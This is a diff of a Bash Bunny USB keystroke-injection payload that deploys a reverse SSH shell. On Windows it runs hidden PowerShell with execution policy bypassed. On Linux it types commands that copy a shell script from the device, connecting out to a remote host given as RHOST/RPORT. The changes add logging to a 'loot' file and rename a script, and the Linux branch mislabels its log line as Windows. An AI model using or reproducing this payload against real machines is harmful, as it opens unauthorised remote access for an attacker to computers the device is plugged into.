@@ -83,11 +83,16 @@ echo "$OS Host detected" >> $LOOTDIR/ssh_rshell.log
 ATTACKMODE HID STORAGE
 LED STAGE2
 if [ "$OS" = "WIN" ]; then
-    RUN WIN powershell -WindowStyle Hidden -ExecutionPolicy Bypass "Add-Type -AssemblyName System.Windows.Forms; .((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\library\\RemoteAccess\\ReverseSSH\\WinRSSH-Shell.ps1') $RHOST $RPORT $USE_CF $PUBKEY"
+    echo "Deploying reverse SSH shell: Windows" >> $LOOTDIR/ssh_rshell.log
+
+    RUN WIN powershell -WindowStyle Hidden -ExecutionPolicy Bypass "Add-Type -AssemblyName System.Windows.Forms; .((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\library\\RemoteAccess\\ReverseSSH\\WinSSH-RShell.ps1') $RHOST $RPORT $USE_CF $PUBKEY"
     
+    echo "Reverse SSH shell deployed" >> $LOOTDIR/ssh_rshell.log
+
     LED SPECIAL
-    exit 0
 elif [ "$OS" = "LINUX" ]; then
+    echo "Deploying reverse SSH shell: Windows" >> $LOOTDIR/ssh_rshell.log
+
     Q CTRL-ALT t
     sleep 1
     Q STRING "cp \$(readlink -f /dev/disk/by-label/BashBunny | while read dev;do mount | grep \"\$dev\b\" | awk '{print \$3}';done)/payloads/library/RemoteAccess/ReverseSSH/LinuxSSH-RShell.sh ~/rshell.sh"
@@ -98,6 +103,8 @@ elif [ "$OS" = "LINUX" ]; then
     LED CLEANUP
     Q STRING "exit"
     Q ENTER
+
+    echo "Reverse SSH shell deployed" >> $LOOTDIR/ssh_rshell.log
 
     LED SPECIAL2
     exit 0
